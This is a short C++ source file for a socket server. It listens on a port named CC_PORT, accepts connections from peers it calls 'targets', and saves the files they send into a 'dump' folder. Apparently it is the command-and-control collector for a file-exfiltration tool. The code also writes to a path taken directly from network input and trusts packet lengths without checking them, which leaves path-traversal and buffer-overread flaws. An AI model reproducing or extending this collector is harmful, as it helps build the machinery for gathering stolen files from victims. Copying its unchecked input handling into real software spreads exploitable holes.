#include <iostream>
#include <string>

#include "Settings.h"
#include "Utils.h"
#include "Socket.h"

#define PORT

int receiveFile(Socket& target)
{
	const size_t buflen = 1024;
	char in[buflen];

	uint8_t response = FAILURE;
	
	size_t len = target.Recv(buflen, in);
	if (len == 0)
		return 0;	// Connection closed

	if (in[0] != 1)
	{
		std::cout << "Wrong Primary Packet Type Sent" << std::endl;
		// Wrong packet type (failed to receive file)
		target.Send(sizeof(response), (char*)&response);

		// Move to next file
		return 1;
	}

	uint32_t index = 0, totalPackets;
	std::string filename;

	memcpy(&totalPackets, in + 1, 4);
	filename = std::string(in + 5);

	std::ofstream outfile("dump\\" + filename, std::ios::binary);
	if (!outfile.is_open())
	{
		std::cout << "failed to open dump file [" << filename << "]" << std::endl;
		
		response = FAILURE;
		target.Send(sizeof(response), (char*)&response);

		return 1;
	}

	do
	{
		Utils::ClearBuffer(buflen, in);

		// Give Go-ahead
		response = SUCCESS;
		target.Send(sizeof(response), (char*)&response);

		len = target.Recv(buflen, in);
		if (len == 0)
			return 0;

		if (in[0] != 2)
		{
			std::cout << "Wrong Secondary Packet Type" << std::endl;

			response = FAILURE;
			target.Send(sizeof(response), (char*)&response);
			outfile.close();

			// Continue to next file
			return 1;
		}

		uint16_t length;
		memcpy(&length, in + 1, 2);

		outfile.write(in+3, length);

		++index;
	} while (index < totalPackets);

	return 1;
}

int main(int argc, char** argv)
{
	int res;

	ServerSocket server(Utils::ToString(CC_PORT));
	if (!server.IsActive())
	{
		std::cerr << "Server failed to open on port " << CC_PORT << std::endl;
		return 1;
	}
	
	std::cout << "Server opened on port " << CC_PORT << std::endl;

	while (true)
	{
		Socket target = server.Accept();
		if (!target.IsActive())
		{
			std::cout << "Target failed to connect" << std::endl;
			target.Close();
			continue;
		}

		do
		{
			res = receiveFile(target);
		} while (res > 0);
	}

	return 0;
}

